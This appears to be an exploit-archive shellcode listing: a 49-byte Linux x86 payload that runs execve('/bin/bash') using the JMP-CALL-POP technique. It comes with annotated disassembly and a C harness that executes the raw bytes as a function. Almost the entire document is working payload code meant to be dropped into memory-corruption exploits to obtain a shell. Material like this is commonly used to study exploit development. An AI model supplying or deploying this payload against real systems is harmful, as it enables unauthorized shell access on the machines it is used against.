/*
Title:    Linux x86 execve("/bin/bash") - 49 bytes
Author:   Amine Kanane <aminekanane_93@hotmail.com>
Desc:     Pop a /bin/bash Using JMP - CALL - POP Trick

Disassembly of section .text:

08048060 <_start>:
 8048060:    eb 18                    jmp    804807a <call_shellcode>

08048062 <shellcode>:
 8048062:    5e                       pop    esi
 8048063:    31 c0                    xor    eax,eax
 8048065:    88 46 09                 mov    BYTE PTR [esi+0x9],al
 8048068:    89 76 0a                 mov    DWORD PTR [esi+0xa],esi
 804806b:    89 46 0e                 mov    DWORD PTR [esi+0xe],eax
 804806e:    8d 1e                    lea    ebx,[esi]
 8048070:    8d 4e 0a                 lea    ecx,[esi+0xa]
 8048073:    8d 56 0e                 lea    edx,[esi+0xe]
 8048076:    b0 0b                    mov    al,0xb
 8048078:    cd 80                    int    0x80

0804807a <call_shellcode>:
 804807a:    e8 e3 ff ff ff           call   8048062 <shellcode>

0804807f <message>:
 804807f:    2f                       das
 8048080:    62 69 6e                 bound  ebp,QWORD PTR [ecx+0x6e]
 8048083:    2f                       das
 8048084:    62 61 73                 bound  esp,QWORD PTR [ecx+0x73]
 8048087:    68 2f 44 49 4e           push   0x4e49442f
 804808c:    41                       inc    ecx
 804808d:    4d                       dec    ebp
 804808e:    49                       dec    ecx
 804808f:    4e                       dec    esi
 8048090:    45                       inc    ebp

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] =  "\xeb\x18\x5e\x31\xc0\x88\x46"
			"\x09\x89\x76\x0a\x89\x46\x0e"
			"\x8d\x1e\x8d\x4e\x0a\x8d\x56"
			"\x0e\xb0\x0b\xcd\x80\xe8\xe3"
			"\xff\xff\xff\x2f\x62\x69\x6e"
			"\x2f\x62\x61\x73\x68\x2f\x44"
			"\x49\x4e\x41\x4d\x49\x4e\x45";
main()
{
	printf("Shellcode Length: %d\n", strlen(code));

	int (*ret)() = (int(*)())code;
	ret();
}
